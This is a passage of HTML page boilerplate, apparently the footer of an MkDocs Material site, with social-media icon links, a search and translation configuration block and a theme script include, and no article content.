1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="https://instagram.com/kf0k" target="_blank" rel="noopener" title="instagram.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
    </a>
  
    
    
      
      
    
    <a href="http://linkedin.com/in/kf0k-mohammed-al-kalbani" target="_blank" rel="noopener" title="linkedin.com" class="md-social__link">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.2.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.tabs", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.db81ec45.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.6df46069.min.js"></script>
      
    
  </body>
</html>